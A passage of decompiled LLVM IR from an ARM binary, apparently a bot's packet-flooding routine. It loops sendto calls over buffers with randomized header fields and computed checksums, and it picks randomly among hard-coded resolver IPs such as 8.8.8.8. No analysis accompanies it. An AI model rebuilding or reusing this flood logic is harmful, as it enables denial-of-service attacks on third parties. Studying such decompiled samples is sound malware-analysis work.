  store i32 %v0_ef58, i32* %stack_var_-40, align 4
  %v8_ef5c = icmp sgt i32 %v1_e9f8, %v1_ef30
  br i1 %v8_ef5c, label %dec_label_pc_edb8, label %dec_label_pc_ef60

dec_label_pc_ef60:                                ; preds = %dec_label_pc_ef20, %dec_label_pc_f12c
  %v4_efd0.pre-phi = phi i32 [ %v4_f130, %dec_label_pc_f12c ], [ %v4_ed04, %dec_label_pc_ef20 ]
  store i32 %v1_e9f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_ecdc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_ef6c, %dec_label_pc_f090, %dec_label_pc_ef60
  br i1 %v2_ecdc, label %dec_label_pc_ef6c, label %dec_label_pc_ef70

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef6c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r6, align 4
  %v0_ef80 = load i32, i32* @fp, align 4
  %v1_ef80 = add i32 %v0_ef80, 27
  store i32 %v1_ef80, i32* @sb, align 4
  %v1_ef84 = add i32 %v0_ef80, 47
  store i32 %v1_ef84, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_ef8c

dec_label_pc_ef8c:                                ; preds = %dec_label_pc_efcc.dec_label_pc_ef8c_crit_edge, %dec_label_pc_ef70
  %v1_efac = phi i32 [ %v1_ef98.pre, %dec_label_pc_efcc.dec_label_pc_ef8c_crit_edge ], [ 65535, %dec_label_pc_ef70 ]
  %v1_ef94 = phi i32 [ %v1_f07c, %dec_label_pc_efcc.dec_label_pc_ef8c_crit_edge ], [ 0, %dec_label_pc_ef70 ]
  store i32 %v2_ea10, i32* %r3.global-to-local, align 4
  store i32 %v3_eccc, i32* %r8.global-to-local, align 4
  %v4_ef94 = mul i32 %v1_ef94, 4
  %v5_ef94 = add i32 %v4_ef94, %v2_ea10
  %v6_ef94 = inttoptr i32 %v5_ef94 to i32*
  %v7_ef94 = load i32, i32* %v6_ef94, align 4
  store i32 %v7_ef94, i32* @r4, align 4
  %v9_ef98 = icmp eq i32 %v3_eccc, %v1_efac
  store i1 %v9_ef98, i1* %cpsr_z.global-to-local, align 1
  %v1_ef9c = add i32 %v7_ef94, 20
  store i32 %v1_ef9c, i32* @r5, align 4
  %v1_efa0 = add i32 %v7_ef94, 28
  store i32 %v1_efa0, i32* @r8, align 4
  br i1 %v9_ef98, label %dec_label_pc_f0a0, label %dec_label_pc_efa8

dec_label_pc_efa8:                                ; preds = %dec_label_pc_ef8c
  store i32 %v3_ecd0, i32* %ip.global-to-local, align 4
  %v9_efac = icmp eq i32 %v3_ecd0, %v1_efac
  store i1 %v9_efac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efac, label %dec_label_pc_f0bc, label %dec_label_pc_efb4

dec_label_pc_efb4:                                ; preds = %dec_label_pc_f0a0.dec_label_pc_efb4_crit_edge, %dec_label_pc_efa8
  %v1_efb8 = phi i32 [ %v1_efb8.pre, %dec_label_pc_f0a0.dec_label_pc_efb4_crit_edge ], [ %v1_efac, %dec_label_pc_efa8 ]
  store i32 %v3_ecd4, i32* %lr.global-to-local, align 4
  %v9_efb8 = icmp eq i32 %v3_ecd4, %v1_efb8
  store i1 %v9_efb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efb8, label %dec_label_pc_f0d8, label %dec_label_pc_efc0

dec_label_pc_efc0:                                ; preds = %dec_label_pc_f0bc.dec_label_pc_efc0_crit_edge, %dec_label_pc_efb4
  %v1_efc4 = phi i32 [ %v1_efc4.pre, %dec_label_pc_f0bc.dec_label_pc_efc0_crit_edge ], [ %v1_efb8, %dec_label_pc_efb4 ]
  store i32 %v3_ecd8, i32* %r0.global-to-local, align 4
  %v9_efc4 = icmp eq i32 %v3_ecd8, %v1_efc4
  store i1 %v9_efc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efc4, label %dec_label_pc_f0f4, label %dec_label_pc_efcc

dec_label_pc_efcc:                                ; preds = %dec_label_pc_f0d8, %dec_label_pc_efc0, %dec_label_pc_f0f4
  %v0_efcc = load i32, i32* @r4, align 4
  %v1_efcc = add i32 %v0_efcc, 41
  store i32 %v1_efcc, i32* %r0.global-to-local, align 4
  store i32 %v4_efd0.pre-phi, i32* %r1.global-to-local, align 4
  %v2_efd4 = call i32 @function_10c8c(i32 %v1_efcc, i32 %v4_efd0.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_efdc = load i32, i32* @r7, align 4
  %v1_efdc = trunc i32 %v0_efdc to i8
  %v2_efdc = load i32, i32* @r4, align 4
  %v3_efdc = add i32 %v2_efdc, 10
  %v4_efdc = inttoptr i32 %v3_efdc to i8*
  store i8 %v1_efdc, i8* %v4_efdc, align 1
  %v0_efe0 = load i32, i32* @r7, align 4
  %v1_efe0 = trunc i32 %v0_efe0 to i8
  %v2_efe0 = load i32, i32* @r4, align 4
  %v3_efe0 = add i32 %v2_efe0, 11
  %v4_efe0 = inttoptr i32 %v3_efe0 to i8*
  store i8 %v1_efe0, i8* %v4_efe0, align 1
  %v0_efe4 = load i32, i32* @r4, align 4
  store i32 %v0_efe4, i32* @r0, align 4
  %v2_efe8 = call i32 @function_f19c(i32 %v0_efe4, i32 20)
  %v3_efe8 = trunc i32 %v2_efe8 to i8
  store i32 %v2_efe8, i32* %r0.global-to-local, align 4
  %v4_efec = sdiv i32 %v2_efe8, 256
  store i32 %v4_efec, i32* %r3.global-to-local, align 4
  %v1_eff0 = trunc i32 %v4_efec to i8
  %v2_eff0 = load i32, i32* @r4, align 4
  %v3_eff0 = add i32 %v2_eff0, 11
  %v4_eff0 = inttoptr i32 %v3_eff0 to i8*
  store i8 %v1_eff0, i8* %v4_eff0, align 1
  %v3_eff4 = load i32, i32* @r4, align 4
  %v4_eff4 = add i32 %v3_eff4, 10
  %v5_eff4 = inttoptr i32 %v4_eff4 to i8*
  store i8 %v3_efe8, i8* %v5_eff4, align 1
  %v0_eff8 = load i32, i32* @r7, align 4
  %v1_eff8 = trunc i32 %v0_eff8 to i8
  %v2_eff8 = load i32, i32* @r5, align 4
  %v3_eff8 = add i32 %v2_eff8, 6
  %v4_eff8 = inttoptr i32 %v3_eff8 to i8*
  store i8 %v1_eff8, i8* %v4_eff8, align 1
  %v0_effc = load i32, i32* @r7, align 4
  %v1_effc = trunc i32 %v0_effc to i8
  %v2_effc = load i32, i32* @r5, align 4
  %v3_effc = add i32 %v2_effc, 7
  %v4_effc = inttoptr i32 %v3_effc to i8*
  store i8 %v1_effc, i8* %v4_effc, align 1
  %v0_f000 = load i32, i32* @r4, align 4
  %v1_f000 = add i32 %v0_f000, 24
  %v2_f000 = inttoptr i32 %v1_f000 to i8*
  %v3_f000 = load i8, i8* %v2_f000, align 1
  %v4_f000 = zext i8 %v3_f000 to i32
  store i32 %v4_f000, i32* %r3.global-to-local, align 4
  %v1_f004 = add i32 %v0_f000, 25
  %v2_f004 = inttoptr i32 %v1_f004 to i8*
  %v3_f004 = load i8, i8* %v2_f004, align 1
  %v4_f004 = zext i8 %v3_f004 to i32
  %v0_f008 = load i32, i32* @r5, align 4
  store i32 %v0_f008, i32* @r1, align 4
  %v4_f00c = mul nuw nsw i32 %v4_f004, 256
  %v5_f00c = or i32 %v4_f00c, %v4_f000
  store i32 %v5_f00c, i32* %r2.global-to-local, align 4
  store i32 %v0_f000, i32* %r0.global-to-local, align 4
  %v0_f014 = load i32, i32* @sb, align 4
  store i32 %v0_f014, i32* %r3.global-to-local, align 4
  %v4_f018 = call i32 @function_f1f8(i32 %v0_f000, i32 %v0_f008, i32 %v5_f00c, i32 %v0_f014)
  %v5_f018 = trunc i32 %v4_f018 to i8
  store i32 %v4_f018, i32* %r0.global-to-local, align 4
  %v3_f01c = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_f02c = mul i32 %v3_f01c, 24
  %v2_f030 = add i32 %v5_f02c, %arg2
  store i32 %v2_f030, i32* %lr.global-to-local, align 4
  %v4_f034 = sdiv i32 %v4_f018, 256
  store i32 %v4_f034, i32* %r3.global-to-local, align 4
  %v3_f038 = load i32, i32* @r5, align 4
  %v4_f038 = add i32 %v3_f038, 6
  %v5_f038 = inttoptr i32 %v4_f038 to i8*
  store i8 %v5_f018, i8* %v5_f038, align 1
  %v0_f03c = load i32, i32* %r3.global-to-local, align 4
  %v1_f03c = trunc i32 %v0_f03c to i8
  %v2_f03c = load i32, i32* @r5, align 4
  %v3_f03c = add i32 %v2_f03c, 7
  %v4_f03c = inttoptr i32 %v3_f03c to i8*
  store i8 %v1_f03c, i8* %v4_f03c, align 1
  %v0_f040 = load i32, i32* %r2.global-to-local, align 4
  %v1_f040 = load i32, i32* %lr.global-to-local, align 4
  %v2_f040 = add i32 %v1_f040, 4
  %v3_f040 = inttoptr i32 %v2_f040 to i32*
  store i32 %v0_f040, i32* %v3_f040, align 4
  %v0_f044 = load i32, i32* @r4, align 4
  %v1_f044 = add i32 %v0_f044, 20
  %v2_f044 = inttoptr i32 %v1_f044 to i32*
  %v3_f044 = load i32, i32* %v2_f044, align 4
  %v3_f048 = udiv i32 %v3_f044, 65536
  store i32 %v3_f048, i32* %r3.global-to-local, align 4
  %v3_f04c13 = udiv i32 %v3_f044, 16777216
  %v1_f050 = trunc i32 %v3_f04c13 to i8
  %v2_f050 = load i32, i32* %lr.global-to-local, align 4
  %v3_f050 = add i32 %v2_f050, 3
  %v4_f050 = inttoptr i32 %v3_f050 to i8*
  store i8 %v1_f050, i8* %v4_f050, align 1
  %v0_f054 = load i32, i32* %r3.global-to-local, align 4
  %v1_f054 = trunc i32 %v0_f054 to i8
  %v2_f054 = load i32, i32* %lr.global-to-local, align 4
  %v3_f054 = add i32 %v2_f054, 2
  %v4_f054 = inttoptr i32 %v3_f054 to i8*
  store i8 %v1_f054, i8* %v4_f054, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f060 = load i32, i32* @r4, align 4
  store i32 %v0_f060, i32* %r1.global-to-local, align 4
  store i32 %v3_ec6c, i32* %r0.global-to-local, align 4
  %v0_f068 = load i32, i32* @sl, align 4
  store i32 %v0_f068, i32* %r2.global-to-local, align 4
  %v0_f06c = load i32, i32* %lr.global-to-local, align 4
  %v4_f06c = inttoptr i32 %v0_f06c to %sockaddr*
  %v7_f074 = inttoptr i32 %v0_f060 to i32*
  %v9_f074 = call i32 @sendto(i32 %v3_ec6c, i32* %v7_f074, i32 %v0_f068, i32 16384, %sockaddr* %v4_f06c, i32 16)
  %v3_f078 = load i32, i32* %stack_var_-40, align 4
  %v1_f07c = add i32 %v3_f078, 1
  store i32 %v1_f07c, i32* %r0.global-to-local, align 4
  store i32 %v1_e9f8, i32* %r3.global-to-local, align 4
  %v9_f084 = icmp eq i32 %v1_e9f8, %v1_f07c
  store i1 %v9_f084, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f07c, i32* %stack_var_-40, align 4
  %v8_f08c = icmp sgt i32 %v1_e9f8, %v1_f07c
  br i1 %v8_f08c, label %dec_label_pc_efcc.dec_label_pc_ef8c_crit_edge, label %dec_label_pc_f090

dec_label_pc_efcc.dec_label_pc_ef8c_crit_edge:    ; preds = %dec_label_pc_efcc
  %v1_ef98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ef8c

dec_label_pc_f090:                                ; preds = %dec_label_pc_efcc
  store i32 %v1_e9f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef6c

dec_label_pc_f0a0:                                ; preds = %dec_label_pc_ef8c
  %v0_f0a0 = call i32 @function_10bd8()
  %v1_f0a0 = trunc i32 %v0_f0a0 to i8
  store i32 %v0_f0a0, i32* %r0.global-to-local, align 4
  store i32 %v3_ecd0, i32* %ip.global-to-local, align 4
  %v4_f0a8 = sdiv i32 %v0_f0a0, 256
  store i32 %v4_f0a8, i32* %r3.global-to-local, align 4
  %v1_f0ac = load i32, i32* @r6, align 4
  %v9_f0ac = icmp eq i32 %v3_ecd0, %v1_f0ac
  store i1 %v9_f0ac, i1* %cpsr_z.global-to-local, align 1
  %v1_f0b0 = trunc i32 %v4_f0a8 to i8
  %v2_f0b0 = load i32, i32* @r4, align 4
  %v3_f0b0 = add i32 %v2_f0b0, 5
  %v4_f0b0 = inttoptr i32 %v3_f0b0 to i8*
  store i8 %v1_f0b0, i8* %v4_f0b0, align 1
  %v3_f0b4 = load i32, i32* @r4, align 4
  %v4_f0b4 = add i32 %v3_f0b4, 4
  %v5_f0b4 = inttoptr i32 %v4_f0b4 to i8*
  store i8 %v1_f0a0, i8* %v5_f0b4, align 1
  %v0_f0b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0b8, label %dec_label_pc_f0bc, label %dec_label_pc_f0a0.dec_label_pc_efb4_crit_edge

dec_label_pc_f0a0.dec_label_pc_efb4_crit_edge:    ; preds = %dec_label_pc_f0a0
  %v1_efb8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_efb4

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_f0a0, %dec_label_pc_efa8
  %v0_f0bc = call i32 @function_10bd8()
  %v1_f0bc = trunc i32 %v0_f0bc to i8
  store i32 %v0_f0bc, i32* %r0.global-to-local, align 4
  store i32 %v3_ecd4, i32* %lr.global-to-local, align 4
  %v4_f0c4 = sdiv i32 %v0_f0bc, 256
  store i32 %v4_f0c4, i32* %r3.global-to-local, align 4
  %v1_f0c8 = load i32, i32* @r6, align 4
  %v9_f0c8 = icmp eq i32 %v3_ecd4, %v1_f0c8
  store i1 %v9_f0c8, i1* %cpsr_z.global-to-local, align 1
  %v3_f0cc = load i32, i32* @r4, align 4
  %v4_f0cc = add i32 %v3_f0cc, 20
  %v5_f0cc = inttoptr i32 %v4_f0cc to i8*
  store i8 %v1_f0bc, i8* %v5_f0cc, align 1
  %v0_f0d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f0d0 = trunc i32 %v0_f0d0 to i8
  %v2_f0d0 = load i32, i32* @r5, align 4
  %v3_f0d0 = add i32 %v2_f0d0, 1
  %v4_f0d0 = inttoptr i32 %v3_f0d0 to i8*
  store i8 %v1_f0d0, i8* %v4_f0d0, align 1
  %v0_f0d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0d4, label %dec_label_pc_f0d8, label %dec_label_pc_f0bc.dec_label_pc_efc0_crit_edge

dec_label_pc_f0bc.dec_label_pc_efc0_crit_edge:    ; preds = %dec_label_pc_f0bc
  %v1_efc4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_efc0

dec_label_pc_f0d8:                                ; preds = %dec_label_pc_f0bc, %dec_label_pc_efb4
  %v0_f0d8 = call i32 @function_10bd8()
  %v1_f0d8 = trunc i32 %v0_f0d8 to i8
  %v4_f0dc = sdiv i32 %v0_f0d8, 256
  store i32 %v4_f0dc, i32* %r3.global-to-local, align 4
  %v3_f0e0 = load i32, i32* @r5, align 4
  %v4_f0e0 = add i32 %v3_f0e0, 2
  %v5_f0e0 = inttoptr i32 %v4_f0e0 to i8*
  store i8 %v1_f0d8, i8* %v5_f0e0, align 1
  store i32 %v3_ecd8, i32* %r0.global-to-local, align 4
  %v1_f0e8 = load i32, i32* @r6, align 4
  %v9_f0e8 = icmp eq i32 %v3_ecd8, %v1_f0e8
  store i1 %v9_f0e8, i1* %cpsr_z.global-to-local, align 1
  %v0_f0ec = load i32, i32* %r3.global-to-local, align 4
  %v1_f0ec = trunc i32 %v0_f0ec to i8
  %v2_f0ec = load i32, i32* @r5, align 4
  %v3_f0ec = add i32 %v2_f0ec, 3
  %v4_f0ec = inttoptr i32 %v3_f0ec to i8*
  store i8 %v1_f0ec, i8* %v4_f0ec, align 1
  %v0_f0f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0f0, label %dec_label_pc_f0f4, label %dec_label_pc_efcc

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_f0d8, %dec_label_pc_efc0
  %v0_f0f4 = call i32 @function_10bd8()
  %v1_f0f4 = trunc i32 %v0_f0f4 to i8
  store i32 %v0_f0f4, i32* %r0.global-to-local, align 4
  %v4_f0f8 = sdiv i32 %v0_f0f4, 256
  store i32 %v4_f0f8, i32* %r3.global-to-local, align 4
  %v3_f0fc = load i32, i32* @r4, align 4
  %v4_f0fc = add i32 %v3_f0fc, 28
  %v5_f0fc = inttoptr i32 %v4_f0fc to i8*
  store i8 %v1_f0f4, i8* %v5_f0fc, align 1
  %v0_f100 = load i32, i32* %r3.global-to-local, align 4
  %v1_f100 = trunc i32 %v0_f100 to i8
  %v2_f100 = load i32, i32* @r8, align 4
  %v3_f100 = add i32 %v2_f100, 1
  %v4_f100 = inttoptr i32 %v3_f100 to i8*
  store i8 %v1_f100, i8* %v4_f100, align 1
  br label %dec_label_pc_efcc

dec_label_pc_f108:                                ; preds = %dec_label_pc_ebd4, %dec_label_pc_eba0, %dec_label_pc_eb44, %dec_label_pc_e9ec
  %v0_f108 = call i32 @function_10bd8()
  %v1_f10c = urem i32 %v0_f108, 4
  store i32 %v1_f10c, i32* %r0.global-to-local, align 4
  %v2_f110 = icmp eq i32 %v1_f10c, 3
  store i1 %v2_f110, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_f108 to i2
  switch i2 %trunc, label %dec_label_pc_ec4821 [
    i2 0, label %dec_label_pc_f150
    i2 1, label %dec_label_pc_f164
    i2 -2, label %dec_label_pc_f170
    i2 -1, label %dec_label_pc_f180
  ]

dec_label_pc_f12c:                                ; preds = %dec_label_pc_eca8
  store i32 %v2_ec58, i32* %r0.global-to-local, align 4
  %v4_f130 = sext i8 %v5_ecc4 to i32
  store i32 %v4_f130, i32* %r1.global-to-local, align 4
  %v2_f134 = add i32 %v4_f130, %v2_ec58
  store i32 %v2_f134, i32* @fp, align 4
  br label %dec_label_pc_ef60

dec_label_pc_f13c:                                ; preds = %dec_label_pc_ec7c
  store i32 %v3_ec6c, i32* %r0.global-to-local, align 4
  %v1_f140 = call i32 @close(i32 %v3_ec6c)
  store i32 %v1_f140, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f144

dec_label_pc_f144:                                ; preds = %dec_label_pc_ec54, %dec_label_pc_ec48, %dec_label_pc_f13c
  %v29_f14c = phi i32 [ %v3_ec6c, %dec_label_pc_ec54 ], [ %v29_f14c75, %dec_label_pc_ec48 ], [ %v1_f140, %dec_label_pc_f13c ]
  store i32 %v3_e9ec, i32* %r4.global-to-local, align 4
  store i32 %v6_e9ec, i32* %r5.global-to-local, align 4
  store i32 %v9_e9ec, i32* %r6.global-to-local, align 4
  store i32 %v12_e9ec, i32* %r7.global-to-local, align 4
  store i32 %v15_e9ec, i32* %r8.global-to-local, align 4
  store i32 %v18_e9ec, i32* %sb.global-to-local, align 4
  store i32 %v21_e9ec, i32* %sl.global-to-local, align 4
  store i32 %v24_e9ec, i32* %fp.global-to-local, align 4
  ret i32 %v29_f14c

dec_label_pc_f150:                                ; preds = %dec_label_pc_f108
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec48

dec_label_pc_f164:                                ; preds = %dec_label_pc_f108
  store i32 707416650, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec48

dec_label_pc_f170:                                ; preds = %dec_label_pc_f108
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ec48

dec_label_pc_f180:                                ; preds = %dec_label_pc_f108
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec48

; uselistorder directives
  uselistorder i32 %v4_f130, { 0, 2, 1 }
  uselistorder i32 %v1_f10c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_f108, { 1, 0 }
  uselistorder i32 %v0_f0f4, { 0, 2, 1 }
  uselistorder i32 %v0_f0bc, { 0, 2, 1 }
  uselistorder i32 %v4_f0a8, { 1, 0 }
  uselistorder i32 %v0_f0a0, { 0, 2, 1 }
  uselistorder i32 %v1_f07c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_f018, { 0, 2, 1 }
  uselistorder i32 %v0_f000, { 1, 0, 2, 3 }
  uselistorder i32 %v4_efec, { 1, 0 }
  uselistorder i32 %v2_efe8, { 0, 2, 1 }
  uselistorder i32 %v7_ef94, { 1, 0, 2 }
  uselistorder i32 %v4_efd0.pre-phi, { 1, 0 }
  uselistorder i32 %v2_ef14, { 1, 0 }
  uselistorder i32 %v1_ef0887, { 1, 0, 2 }
  uselistorder i32 %v1_eefc, { 2, 1, 0 }
  uselistorder i32 %v0_eefc, { 1, 2, 0 }
  uselistorder i32 %v0_eefc33, { 1, 0 }
  uselistorder i32 %v1_eefc34, { 2, 0, 1 }
  uselistorder i8 %extract.t79, { 1, 0 }
  uselistorder i32 %v1_eed0, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_ee4c, { 1, 0 }
  uselistorder i32 %v3_ed88, { 1, 0, 2 }
  uselistorder i32 %v1_ed50, { 1, 0 }
  uselistorder i32 %v1_ed44, { 1, 0 }
  uselistorder i32 %v1_ed28, { 1, 0 }
  uselistorder i32 %v1_ed14, { 1, 0 }
  uselistorder i32 %v3_ed0c, { 1, 0 }
  uselistorder i32 %v4_ed04, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_ecc4, { 1, 0 }
  uselistorder i32 %v0_ecc0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ecbc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ecb4, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_eca0, { 1, 0 }
  uselistorder i1 %v7_ec70, { 1, 0 }
  uselistorder i32 %v3_ec6c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v2_ec58, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v0_ec40, { 1, 0, 2 }
  uselistorder i1 %v7_ec10, { 1, 0 }
  uselistorder i32 %v1_ec0c, { 1, 0, 2 }
  uselistorder i1 %v8_ec04, { 1, 0 }
  uselistorder i1 %v7_ec00, { 1, 0 }
  uselistorder i32 %v1_ebf4, { 1, 0 }
  uselistorder i8 %v2_ebe8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ebec, { 1, 0 }
  uselistorder i32 %v0_ec0c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_ebd8, { 0, 2, 1 }
  uselistorder i32 %v1_ebf0, { 0, 2, 1 }
  uselistorder i32 %v2_ebc0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_ebb8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_eba0, { 1, 2, 0, 3, 4, 5 }
  uselistorder i1 %v7_eb98, { 1, 0 }
  uselistorder i32 %v0_eb98, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder i32 %v0_eb3c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_eb0c, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_ea90, { 1, 0 }
  uselistorder i32 %v7_ea4c, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_ea48, { 1, 0 }
  uselistorder i32 %v6_ea28, { 1, 0 }
  uselistorder i32 %v2_ea10, { 0, 3, 1, 2 }
  uselistorder i32 %v1_e9f8, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32* %sb.global-to-local, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 16, 41, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 5, 8, 7, 9, 10, 11, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 13, 12, 15, 14, 16, 18, 17, 20, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 1, 42, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 46, 43, 44, 45, 47, 49, 48, 50, 51, 52, 54, 53, 56, 55, 57, 58, 60, 59, 61, 63, 62, 65, 64, 66, 67, 68, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 8, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 30, 31, 32, 29, 26, 33, 34, 35 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_b240, { 89, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 90, 91 }
  uselistorder label %dec_label_pc_f144, { 2, 0, 1 }
  uselistorder label %dec_label_pc_efcc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ef60, { 1, 0 }
  uselistorder label %bb149, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_ec1c, { 1, 0 }
  uselistorder label %dec_label_pc_ec10, { 1, 0 }
  uselistorder label %dec_label_pc_ebd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ebcc, { 1, 0 }
}

define i32 @function_f19c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f19c:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_f1cc, label %dec_label_pc_f1a8

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f19c
  %v0_f1ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f1ac

dec_label_pc_f1ac:                                ; preds = %dec_label_pc_f1ac, %dec_label_pc_f1a8
  %v0_f1c0 = phi i32 [ %v2_f1c0, %dec_label_pc_f1ac ], [ 0, %dec_label_pc_f1a8 ]
  %v0_f1b4 = phi i32 [ %v1_f1b4, %dec_label_pc_f1ac ], [ %arg1, %dec_label_pc_f1a8 ]
  %v0_f1c4 = phi i32 [ %v1_f1c4, %dec_label_pc_f1ac ], [ %v0_f1ac.pre, %dec_label_pc_f1a8 ]
  %v1_f1ac = inttoptr i32 %v0_f1c4 to i8*
  %v2_f1ac = load i8, i8* %v1_f1ac, align 1
  %v3_f1ac = zext i8 %v2_f1ac to i32
  %v1_f1b0 = add i32 %v0_f1c4, 1
  %v2_f1b0 = inttoptr i32 %v1_f1b0 to i8*
  %v3_f1b0 = load i8, i8* %v2_f1b0, align 1
  %v4_f1b0 = zext i8 %v3_f1b0 to i32
  %v1_f1b4 = add i32 %v0_f1b4, -2
  %v4_f1b8 = mul nuw nsw i32 %v4_f1b0, 256
  %v5_f1b8 = or i32 %v4_f1b8, %v3_f1ac
  %v2_f1c0 = add i32 %v5_f1b8, %v0_f1c0
  %v1_f1c4 = add i32 %v0_f1c4, 2
  store i32 %v1_f1c4, i32* @r0, align 4
  %v1_f1b4.cmp = icmp ugt i32 %v1_f1b4, 1
  br i1 %v1_f1b4.cmp, label %dec_label_pc_f1ac, label %dec_label_pc_f1cc

dec_label_pc_f1cc:                                ; preds = %dec_label_pc_f1ac, %dec_label_pc_f19c
